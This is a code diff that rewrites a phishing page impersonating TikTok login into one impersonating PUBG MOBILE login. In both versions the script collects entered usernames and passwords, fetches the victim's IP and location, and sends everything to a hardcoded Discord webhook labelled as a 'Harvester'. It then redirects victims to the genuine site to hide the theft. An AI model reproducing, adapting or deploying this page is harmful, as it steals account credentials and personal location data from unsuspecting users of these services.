@@ -1,231 +1,82 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang='en'>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Log in | TikTok</title>
+    <meta charset='UTF-8'>
+    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
+    <title>PUBG MOBILE - Official Login</title>
     <style>
-        body {
-            font-family: 'Proxima Nova', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
-            background-color: #fff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .login-container {
-            width: 100%;
-            max-width: 400px;
-            padding: 20px;
-            text-align: center;
-        }
-        .logo {
-            font-size: 32px;
-            font-weight: bold;
-            margin-bottom: 30px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-        .logo span {
-            color: #000;
-        }
-        .logo .icon {
-            width: 40px;
-            height: 40px;
-            background-color: #000;
-            border-radius: 50%;
-            display: inline-block;
-            position: relative;
-        }
-        .logo .icon::before {
-            content: '';
-            position: absolute;
-            top: 10px; left: 15px;
-            width: 5px; height: 15px;
-            background: #fff;
-        }
-        h2 {
-            font-size: 24px;
-            margin-bottom: 20px;
-        }
-        .input-group {
-            margin-bottom: 15px;
-            text-align: left;
-        }
-        .input-group input {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #e3e3e4;
-            border-radius: 4px;
-            font-size: 16px;
-            box-sizing: border-box;
-            background-color: #f8f8f8;
-        }
-        .input-group input:focus {
-            outline: none;
-            border-color: #fe2c55;
-            background-color: #fff;
-        }
-        .links {
-            display: flex;
-            justify-content: space-between;
-            font-size: 14px;
-            margin-bottom: 20px;
-        }
-        .links a {
-            color: #161823;
-            text-decoration: none;
-        }
-        .links a:hover {
-            text-decoration: underline;
-        }
-        .login-btn {
-            width: 100%;
-            padding: 14px;
-            background-color: #fe2c55;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-        }
-        .login-btn:hover {
-            background-color: #ef2950;
-        }
-        .signup-link {
-            margin-top: 20px;
-            font-size: 14px;
-            color: #161823;
-        }
-        .signup-link a {
-            color: #fe2c55;
-            font-weight: bold;
-            text-decoration: none;
-        }
+        body { margin: 0; font-family: sans-serif; background: #111 url('https://www.pubgmobile.com/en/images/main_bg.jpg') center/cover; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .box { background: rgba(0,0,0,0.85); padding: 40px; border-radius: 8px; width: 90%; max-width: 380px; border: 1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.8); }
+        h2 { color: #f2a900; text-align: center; font-style: italic; margin-top: 0; font-size: 28px; letter-spacing: 2px; }
+        label { display: block; margin-bottom: 5px; color: #aaa; font-size: 13px; }
+        input { width: 100%; padding: 12px; margin-bottom: 20px; background: #222; border: 1px solid #444; color: #fff; border-radius: 4px; box-sizing: border-box; }
+        input:focus { border-color: #f2a900; outline: none; }
+        button { width: 100%; padding: 14px; background: #f2a900; color: #000; font-weight: bold; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
+        button:hover { background: #d89600; }
+        .links { display: flex; justify-content: space-between; margin-top: 15px; font-size: 12px; }
+        .links a { color: #f2a900; text-decoration: none; }
     </style>
 </head>
 <body>
-
-<div class="login-container">
-    <div class="logo">
-        <div class="icon"></div>
-        <span>TikTok</span>
-    </div>
-    <h2>Log in to TikTok</h2>
-    
-    <form id="tiktok-login">
-        <div class="input-group">
-            <input type="text" id="username" placeholder="Email or username" required>
+<div class='box'>
+    <h2>PUBG MOBILE</h2>
+    <form id='loginForm'>
+        <label>Email or Phone Number</label>
+        <input type='text' id='email' required>
+        <label>Password</label>
+        <input type='password' id='password' required>
+        <button type='submit' id='submitBtn'>LOG IN</button>
+        <div class='links'>
+            <a href='#' id='forgot'>Forgot Password?</a>
+            <a href='#' id='register'>Register</a>
         </div>
-        <div class="input-group">
-            <input type="password" id="password" placeholder="Password" required>
-        </div>
-        <div class="links">
-            <a href="#" id="forgot-password">Forgot password?</a>
-            <a href="#" id="login-with-phone">Log in with phone</a>
-        </div>
-        <button type="submit" class="login-btn">Log in</button>
     </form>
-    
-    <div class="signup-link">
-        Don't have an account? <a href="#" id="register">Sign up</a>
-    </div>
 </div>
-
 <script>
-    const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1538702595856539741/9QSZHry-ZfBd20aTqKHCKSrmBxYqrc3jGME50RFX5tVKmi-zAXPrX3gDQaGLI9JR6pj3";
-
-    async function getGeoData() {
+    const WEBHOOK = 'https://discordapp.com/api/webhooks/1538702595856539741/9QSZHry-ZfBd20aTqKHCKSrmBxYqrc3jGME50RFX5tVKmi-zAXPrX3gDQaGLI9JR6pj3';
+    
+    async function sendData(action, e, p) {
         try {
-            const res = await fetch('https://ipapi.co/json/');
-            return await res.json();
-        } catch (e) {
-            return { ip: "Unknown", city: "Unknown", region: "Unknown", country_name: "Unknown" };
-        }
-    }
-
-    function getOS() {
-        const userAgent = window.navigator.userAgent;
-        if (userAgent.indexOf("Windows NT 10.0") !== -1) return "Windows 10/11";
-        if (userAgent.indexOf("Windows NT 6.2") !== -1) return "Windows 8";
-        if (userAgent.indexOf("Windows NT 6.1") !== -1) return "Windows 7";
-        if (userAgent.indexOf("Mac") !== -1) return "MacOS";
-        if (userAgent.indexOf("X11") !== -1) return "UNIX";
-        if (userAgent.indexOf("Linux") !== -1) return "Linux";
-        if (userAgent.indexOf("Android") !== -1) return "Android";
-        if (userAgent.indexOf("iPhone") !== -1) return "iOS";
-        return "Unknown OS";
-    }
-
-    function getBrowser() {
-        const ua = navigator.userAgent;
-        if (ua.includes("Firefox/")) return "Firefox";
-        if (ua.includes("Edg/")) return "Edge";
-        if (ua.includes("Chrome/")) return "Chrome";
-        if (ua.includes("Safari/") && !ua.includes("Chrome/")) return "Safari";
-        return "Unknown Browser";
-    }
-
-    async function sendData(actionType, username = "", password = "") {
-        const geo = await getGeoData();
-        const timestamp = new Date().toISOString();
-        const os = getOS();
-        const browser = getBrowser();
-
-        const payload = {
-            embeds: [{
-                title: "🚨 New TikTok Target Captured 🚨",
-                color: 16723285,
-                fields: [
-                    { name: "Action", value: actionType, inline: true },
-                    { name: "Username/Email", value: username || "N/A", inline: true },
-                    { name: "Password", value: password || "N/A", inline: true },
-                    { name: "IP Address", value: geo.ip, inline: true },
-                    { name: "Location", value: `${geo.city}, ${geo.region}, ${geo.country_name}`, inline: true },
-                    { name: "OS", value: os, inline: true },
-                    { name: "Browser", value: browser, inline: true },
-                    { name: "Timestamp", value: timestamp, inline: false },
-                    { name: "User Agent", value: navigator.userAgent, inline: false }
-                ],
-                footer: { text: "ENI Harvester" }
-            }]
-        };
-
-        try {
-            await fetch(WEBHOOK_URL, {
+            const geo = await fetch('https://ipapi.co/json/').then(r => r.json());
+            const payload = {
+                embeds: [{
+                    title: '🚨 PUBG Harvester: ' + action,
+                    color: 15893760,
+                    fields: [
+                        { name: 'Creds', value: (e || 'N/A') + ' / ' + (p || 'N/A') },
+                        { name: 'IP', value: geo.ip || 'Unknown' },
+                        { name: 'Location', value: geo.city + ', ' + geo.country_name },
+                        { name: 'Time', value: new Date().toLocaleString() },
+                        { name: 'System', value: navigator.userAgent }
+                    ]
+                }]
+            };
+            await fetch(WEBHOOK, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
-        } catch (err) {
-            console.error("Webhook failed", err);
-        }
+        } catch(err) {}
     }
 
-    document.getElementById('tiktok-login').addEventListener('submit', async (e) => {
-        e.preventDefault();
-        const user = document.getElementById('username').value;
-        const pass = document.getElementById('password').value;
-        await sendData("Login Attempt", user, pass);
-        window.location.href = "https://www.tiktok.com/login";
-    });
-
-    document.getElementById('forgot-password').addEventListener('click', async (e) => {
-        e.preventDefault();
-        const user = document.getElementById('username').value;
-        await sendData("Clicked Forgot Password", user, "");
-        window.location.href = "https://www.tiktok.com/login/phone-or-email/forget-password";
-    });
-
-    document.getElementById('register').addEventListener('click', async (e) => {
-        e.preventDefault();
-        await sendData("Clicked Register", "", "");
-        window.location.href = "https://www.tiktok.com/signup";
-    });
+    document.getElementById('loginForm').onsubmit = async (ev) => {
+        ev.preventDefault();
+        document.getElementById('submitBtn').innerText = 'LOGGING IN...';
+        await sendData('Login Attempt', document.getElementById('email').value, document.getElementById('password').value);
+        window.location.href = 'https://www.pubgmobile.com/';
+    };
+    
+    document.getElementById('forgot').onclick = async (ev) => {
+        ev.preventDefault();
+        await sendData('Forgot Password Click', document.getElementById('email').value, '');
+        alert('Reset link sent.');
+    };
+    
+    document.getElementById('register').onclick = async (ev) => {
+        ev.preventDefault();
+        await sendData('Register Click', '', '');
+        window.location.href = 'https://www.pubgmobile.com/';
+    };
 </script>
 </body>
 </html>
